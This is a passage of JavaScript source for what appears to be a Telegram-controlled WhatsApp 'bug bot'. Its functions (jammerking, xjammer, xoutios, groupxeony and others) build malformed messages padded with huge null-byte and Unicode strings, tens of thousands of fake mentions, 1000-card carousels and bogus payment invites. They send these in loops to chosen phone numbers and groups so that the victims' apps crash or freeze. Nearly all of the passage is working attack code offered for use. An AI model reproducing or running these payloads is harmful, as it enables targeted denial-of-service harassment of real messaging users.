      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.error(`Error in xspamdroid for ${userNumber}:`, err.message);
    throw err;
  }
}

async function jammerking(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "#@dgxeon13", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `@dgxeon13${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  } catch (err) {
    console.error(`Error in jammerx for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xeonGalaxtos(target, userNumber, chatId, botInstance) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "@null", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: `Telegram: @dgxeon13${"𑇂𑆵𑆴𑆿".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});

  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  } catch (err) {
    console.error(`Error in delayperma for ${userNumber}:`, err.message);
    throw err;
  }
}

async function jammerking2(target, userNumber, chatId, botInstance, mention = true) {
  try {
    // Validate session
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    // Validate target
    if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
      throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
    }

    const userSock = sessions.get(userNumber);

    let sxo = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Telegram: @dgxeon13",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(target, sXoMessage, {});
      await userSock.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500)
     if (mention) {
        await userSock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await userSock.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500);
    if (mention) {
        await userSock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
  } catch (err) {
    console.error(`Error in delayx for ${userNumber}:`, err.message);
    throw err;
  }
}

async function xjammer(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const jid = `91${randomNumber}@s.whatsapp.net`;
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);

  try {
    const userSock = sessions.get(userNumber);

    for (let i = 0; i < 1000; i++) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        throw new Error('No active WhatsApp session');
      }

      await sleep(3000);
      let tmsg = await generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: userSock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "dgxeon@eu",
            mentionedJid: jids,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
        },
      }, {});

      await userSock.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });

      let push = [];
      for (let i = 0; i < 1000; i++) {
        push.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: ``,
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "",
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: '',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
              fileLength: "73384124",
              height: 1,
              width: 1,
              mediaKey: "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
              fileEncSha256: "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
              directPath: "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
              mediaKeyTimestamp: "1697384837",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            },
          }),
        });
      }

      tmsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: '\0',
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: '\n'.repeat(99),
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false,
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
            }),
          },
        },
      }, {});

      await userSock.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });
    }
  } catch (error) {
    console.error(`Error in xjammer for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function xjammer2(target, userNumber, chatId, botInstance, mention = true) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
 

  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂�82𐍉�82"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  try {
    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, messageContent, { userJid: target });

    const broadcastSend = {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    };

    await userSock.relayMessage("status@broadcast", msg.message, broadcastSend);

    if (mention) {
      await userSock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: " Telegram: @dgxeon13 "
          },
          content: undefined
        }]
      });
    }
  } catch (error) {
    console.error(`Error in xjammer2 for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function xoutios(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const userSock = sessions.get(userNumber);

  const xeonIpong = "𑇂𑆵𑆴𑆿".repeat(60000);
  const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/json",
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "999999999999",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: fileName,
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1715880173"
            },
            hasMediaAttachment: true
          },
          body: { text: bodyText },
          nativeFlowMessage: {
            messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @dgxeon13","flow_id":"Telegram: @dgxeon13","flow_message_version":"9.903","flow_token":"Telegram: @dgxeon13"}`
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @dgxeon13" }]
          }
        }
      }
    }
  }), { userJid: target });

  try {
    const msg1 = await genMsg(`${xeonIpong}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await userSock.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("Telegram: @dgxeon13", "" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await userSock.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await userSock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: xeonIpong,
        url: "https://youtube.com/@DGXeon"
      }
    }, { participant: { jid: target } });

    await userSock.relayMessage(target, {
      extendedTextMessage: {
        text: xeonIpong,
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: 'Telegram: @dgxeon13' + 'ꦾ'.repeat(50000)
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }, {
      participant: { jid: target }
    });

    const paymentMsg = service => ({
      paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
      }
    });

    function generateEncryptedID(service) {
      return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
    }

    for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
      await userSock.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
      });
    }

    await userSock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: "Telegram: @dgxeon13" + xeonIpong,
        url: "https://youtube.com/@DGXeom"
      }
    }, { participant: { jid: target } });

    await userSock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: "Telegram: @dgxeon13" + xeonIpong,
        url: "https://youtube.com/@DGXeon"
      }
    }, { participant: { jid: target } });
  } catch (error) {
    console.error(`Error in xoutios for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function runXiosLoop(target, userNumber, chatId, botInstance) {
  const userBot = getUserBot(botInstance);

  for (let i = 0; i < 100; i++) {
    // Recheck session before each iteration
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      await userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
      return;
    }
    try {
      await xoutios(target, userNumber, chatId, botInstance);
      console.log(`Sent xoutios iteration ${i + 1} to ${target}`);
    } catch (error) {
      console.error(`Error in runXiosLoop for ${userNumber}:`, error.message);
      await userBot.sendMessage(chatId, `❌ Failed to send bvg to ${target.replace('@s.whatsapp.net', '')}: ${error.message}`);
      return; // Stop the loop on error
    }
  }

  await userBot.sendMessage(chatId, `✅ Completed 100 iterations to ${target.replace('@s.whatsapp.net', '')}.`);
}

// ─────── ULTRA SAFE SANITIZER (only bad chars → ?) ───────
function sanitizeGroupName(name) {
  if (!name || typeof name !== 'string') return '[No Name]';

  return name
    // Remove zero-width & invisible junk
    .replace(/[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF\u00AD\u061C\u034F\u180E]/g, '')
    // Remove Zalgo / combining diacritics that break Telegram
    .replace(/[\u0300-\u036F\u1AB0-\u1AFF\u1DC0-\u1DFF\u20D0-\u20FF\uFE20-\uFE2F]/g, '')
    // Fullwidth letters/numbers → normal ASCII
    .replace(/[\uFF01-\uFF60]/g, ch => String.fromCharCode(ch.charCodeAt(0) - 0xFEE0))
    // Anything really weird or private-use → replace with ?
    .replace(/[^\p{L}\p{N}\p{M}\s!@#$%^&*()_+\-=\[\]{};':"\\|,.<>/?~`♥★⚡■◆♢♤♡◇♧☆♠]/gu, '?')
    // Final cleanup
    .normalize('NFKC')
    .slice(0, 90)
    .trim();
}

// ─────── YOUR ORIGINAL DESIGN — NOW BULLETPROOF ───────
async function listGroups(userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) return;

  const userBot = getUserBot(botInstance);
  const userSock = sessions.get(userNumber);

  try {
    const getGroups = await userSock.groupFetchAllParticipating();
    const groups = Object.entries(getGroups).map(([_, meta]) => meta);

    if (groups.length === 0) {
      return await userBot.sendMessage(chatId, 'No groups found for your connected WhatsApp number.');
    }

    const TELEGRAM_LIMIT = 4096;
    const messageParts = [];
    let currentPart = `┌──────┤ LIST OF GROUPS ├──────┐\n\nTotal Groups: ${groups.length}\n\n`;
    let partNumber = 1;
    let hituet = 0;

    for (const meta of groups) {
      const safeName = sanitizeGroupName(meta.subject);

      const entry = `│Group ${++hituet}\n│Name: ${safeName}\n│ID: ${meta.id}\n│Members: ${meta.participants.length}\n╰────┤\n\n`;

      if (currentPart.length + entry.length + 100 < TELEGRAM_LIMIT) {
        currentPart += entry;
      } else {
        currentPart += '└────────────────────────┘';
        messageParts.push(currentPart);

        partNumber++;
        currentPart = `┌──────┤ LIST OF GROUPS (Part ${partNumber}) ├──────┐\n\n`;
        currentPart += entry;
      }
    }

    // Push the last part
    if (currentPart.includes('Name:')) {
      currentPart += '└────────────────────────┘';
      messageParts.push(currentPart);
    }

    // Send all parts with small delay
    for (const part of messageParts) {
      await userBot.sendMessage(chatId, part, { parse_mode: 'HTML' }); // optional: keep if you use HTML
      await new Promise(r => setTimeout(r, 120));
    }

  } catch (error) {
    console.error(`Error in listGroups for ${userNumber}:`, error);

    // Even if something explodes, user gets a clean message
    await userBot.sendMessage(chatId,
      'Some groups have special characters in name.\n' +
      'Bad characters were replaced with ? so the list can be sent safely.\n\n' +
      'Try again now — it will work!'
    );
  }
}

async function groupxeony(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

    let push = [];
    let buttt = [];
    for (let i = 0; i < 1000; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤㅤ" }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤㅤㅤ" }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: '\n',
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "10840",
            height: 10,
            width: 10,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
      });
    }

    const carousel = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: "Telegram: @dgxeon13 " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: 'Telegram: @dgxeon13 ' }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
          }),
        },
      },
    }, {});

    const stanza = [
      { attrs: { biz_bot: '1' }, tag: "bot" },
      { attrs: {}, tag: "biz" },
    ];

    await userSock.relayMessage(target, carousel.message, { quoted: carousel.key.id });

    await userSock.sendMessage(target, {
      location: {
        degreesLatitude: 'Telegram: @dgxeon13',
        degreesLongitude: 'Telegram: @dgxeon13',
        name: `Telegram: @dgxeon13`,
        url: bugUrl,
        contextInfo: {
          forwardingScore: 508,
          isForwarded: true,
          isLiveLocation: true,
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: userNumber + '@s.whatsapp.net',
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              title: "crash",
              pageCount: 1000000000,
              fileName: "crash.pdf",
              contactVcard: true,
            },
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363274419284848@newsletter',
            serverMessageId: 1,
            newsletterName: " " + bug + bug,
          },
          externalAdReply: {
            title: ' Telegram: @dgxeon13 ',
            body: 'Telegram: @dgxeon13',
            mediaType: 0,
            thumbnail: null,
            jpegThumbnail: null,
            mediaUrl: `https://www.youtube.com/@dgxeon`,
            sourceUrl: `https://www.youtube.com/@dgxeon`,
          },
        },
      },
    });
  } catch (error) {
    console.error(`Error in groupxeony for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function xeongroupinvi(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const userBot = getUserBot(botInstance);

let message = {
     ephemeralMessage: {
       message: {
         interactiveMessage: {
           header: {
             title: "Telegram: @dgxeon13",
             hasMediaAttachment: false,
             locationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
               name: "Telegram: @dgxeon13",
               address: "Telegram: @dgxeon13",
             },
           },
           body: {
             text: "Telegram: @dgxeon13",
           },
           nativeFlowMessage: {
             messageParamsJson: "{".repeat(10000),
           },
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await userSock.relayMessage(target, message, {
     messageId: null,
   });
  } catch (error) {
    console.error(`Error in xsucidegc for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function xeonIosInviGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
